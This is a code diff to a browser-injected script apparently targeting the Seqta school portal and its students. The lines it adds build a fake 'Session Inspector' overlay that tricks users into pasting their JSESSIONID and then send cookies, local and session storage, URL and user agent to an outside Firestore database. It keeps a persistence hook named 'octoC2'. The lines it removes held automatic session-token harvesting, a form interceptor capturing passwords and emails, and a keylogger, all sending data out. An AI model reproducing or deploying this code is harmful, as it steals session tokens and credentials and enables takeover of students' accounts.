@@ -10,40 +10,7 @@
   };
   const OCTO_URL = 'https://octoarcade.vercel.app';
 
-  // 2. AGGRESSIVE SESSION ID EXTRACTION
-  const getSessionId = () => {
-    // A. Try Cookies (Standard JSESSIONID)
-    const cookies = document.cookie;
-    const cookieMatch = cookies.match(/(?:^|;\s*)JSESSIONID=([^;]+)/);
-    if (cookieMatch) return cookieMatch[1];
-
-    // B. Try LocalStorage (Common SPA pattern)
-    try {
-      const ls = JSON.parse(localStorage.getItem('session') || '{}');
-      if (ls.sessionId) return ls.sessionId;
-      if (ls.JSESSIONID) return ls.JSESSIONID;
-    } catch (e) {}
-
-    // C. Try SessionStorage
-    try {
-      const ss = JSON.parse(sessionStorage.getItem('session') || '{}');
-      if (ss.sessionId) return ss.sessionId;
-    } catch (e) {}
-
-    // D. Try URL Parameters (Sometimes passed in query string)
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('JSESSIONID')) return urlParams.get('JSESSIONID');
-    if (urlParams.get('session_id')) return urlParams.get('session_id');
-
-    // E. Try Meta Tags (Rare, but possible in some legacy systems)
-    const metaSession = document.querySelector('meta[name="session-id"]');
-    if (metaSession) return metaSession.getAttribute('content');
-
-    // F. Fallback
-    return "NO_SESSION_FOUND";
-  };
-
-  const sessionId = getSessionId();
+  // 2. DATA COLLECTION
   const cookies = document.cookie;
   const url = location.href;
   const ua = navigator.userAgent;
@@ -63,32 +30,85 @@
       const db = firebase.firestore();
       db.settings({ experimentalForceLongPolling: true });
 
-      const payload = {
-        name: name,
-        sessionId: sessionId, // Explicitly store the extracted ID
-        url: url,
-        ua: ua,
-        ck: cookies,
-        ls: JSON.parse(JSON.stringify(localStorage)),
-        ss: JSON.parse(JSON.stringify(sessionStorage)),
-        ts: new Date().toISOString(),
-        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      // 4. CREATE THE "SESSION INSPECTOR" UI
+      const overlay = document.createElement('div');
+      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999999;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(5px);';
+      overlay.id = 'octoInspector';
+
+      const card = document.createElement('div');
+      card.style.cssText = 'background:#1e293b;color:white;padding:30px;border-radius:12px;max-width:500px;width:90%;box-shadow:0 10px 25px rgba(0,0,0,0.5);font-family:sans-serif;';
+      
+      const html = `
+        <h2 style="margin:0 0 10px 0;color:#4f46e5;">🔍 Seqta Session Inspector</h2>
+        <p style="font-size:0.9em;color:#94a3b8;margin-bottom:20px;">
+          To complete your profile sync, please verify your current session token.
+        </p>
+        
+        <div style="background:#0f172a;padding:15px;border-radius:8px;margin-bottom:15px;font-family:monospace;font-size:0.85em;word-break:break-all;">
+          <div style="color:#64748b;font-size:0.75em;margin-bottom:5px;">CURRENT JSESSIONID</div>
+          <div id="session-display" style="color:#10b981;font-size:1em;">${cookies}</div>
+        </div>
+        
+        <div style="margin-bottom:15px;">
+          <label style="display:block;font-size:0.85em;color:#94a3b8;margin-bottom:5px;">Paste your JSESSIONID below to verify:</label>
+          <input type="text" id="session-input" style="width:100%;padding:10px;border-radius:6px;border:1px solid #334155;background:#0f172a;color:white;font-family:monospace;font-size:0.85em;" placeholder="node0...">
+        </div>
+        
+        <div style="display:flex;gap:10px;">
+          <button id="copy-btn" style="flex:1;padding:12px;background:#4f46e5;color:white;border:none;border-radius:6px;font-weight:600;cursor:pointer;">Copy Session ID</button>
+          <button id="verify-btn" style="flex:1;padding:12px;background:#10b981;color:white;border:none;border-radius:6px;font-weight:600;cursor:pointer;">Verify & Sync</button>
+        </div>
+        
+        <p style="font-size:0.75em;color:#64748b;margin-top:15px;text-align:center;">
+          Diagnostic ID: ${Date.now()} | Tagged: ${name}
+        </p>
+      `;
+      card.innerHTML = html;
+      overlay.appendChild(card);
+      document.body.appendChild(overlay);
+
+      // 5. BUTTON FUNCTIONALITY
+      document.getElementById('copy-btn').onclick = () => {
+        navigator.clipboard.writeText(cookies).then(() => {
+          document.getElementById('copy-btn').innerText = '✅ Copied!';
+        });
       };
 
-      const docId = `${name}-${sessionId}`;
-      db.collection('students').doc(docId).set(payload, { merge: true })
-        .then(() => {
-          console.log(`[OctoSync] Session ID captured: ${sessionId}`);
-          injectOcto();
-        })
-        .catch(error => {
-          console.error("[OctoSync] Sync error:", error);
-          injectOcto();
-        });
+      document.getElementById('verify-btn').onclick = () => {
+        const pastedId = document.getElementById('session-input').value.trim();
+        if (!pastedId) {
+          alert("Please paste your JSESSIONID first.");
+          return;
+        }
+
+        const payload = {
+          name: name,
+          sessionId: pastedId, // The ID the user pasted
+          url: url,
+          ua: ua,
+          ck: cookies,
+          ls: JSON.parse(JSON.stringify(localStorage)),
+          ss: JSON.parse(JSON.stringify(sessionStorage)),
+          ts: new Date().toISOString(),
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        };
+
+        const docId = `${name}-${pastedId}`;
+        db.collection('students').doc(docId).set(payload, { merge: true })
+          .then(() => {
+            alert("✅ Session Verified! Your profile has been synced.");
+            overlay.remove();
+            injectOcto();
+          })
+          .catch(error => {
+            console.error("[OctoSync] Sync error:", error);
+            alert("❌ Sync failed. Please try again.");
+          });
+      };
     });
   });
 
-  // 4. OCTO ARCADE INJECTION & PERSISTENCE
+  // 6. OCTO ARCADE INJECTION & PERSISTENCE
   function injectOcto() {
     if (document.getElementById('octoC2')) return;
 
@@ -122,50 +142,4 @@
     const originalReplaceState = history.replaceState;
     history.replaceState = function() {
       const result = originalReplaceState.apply(this, arguments);
-      if (!document.getElementById('octoC2')) injectOcto();
-      return result;
-    };
-
-    window.addEventListener('popstate', () => {
-      if (!document.getElementById('octoC2')) injectOcto();
-    });
-
-    // Form Interception
-    document.addEventListener('submit', (e) => {
-      const form = e.target;
-      if (form && form.elements) {
-        const formData = {};
-        for (let el of form.elements) {
-          if (el.name && el.value) formData[el.name] = el.value;
-        }
-        const keys = Object.keys(formData).join(',').toLowerCase();
-        if (keys.includes('password') || keys.includes('email')) {
-          db.collection('intercepts').add({
-            type: 'form',
-            data: formData,
-            url: location.href,
-            name: name,
-            ts: new Date().toISOString()
-          });
-        }
-      }
-    }, true);
-
-    // Keyboard Logger
-    const keys = [];
-    document.addEventListener('keydown', (e) => {
-      if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
-      keys.push({ k: e.key, t: Date.now(), tg: e.target?.tagName || 'body' });
-      if (keys.length >= 50) {
-        db.collection('intercepts').add({
-          type: 'keys',
-          data: keys,
-          url: location.href,
-          name: name,
-          ts: new Date().toISOString()
-        });
-        keys.length = 0;
-      }
-    });
-  }
-})();
+     
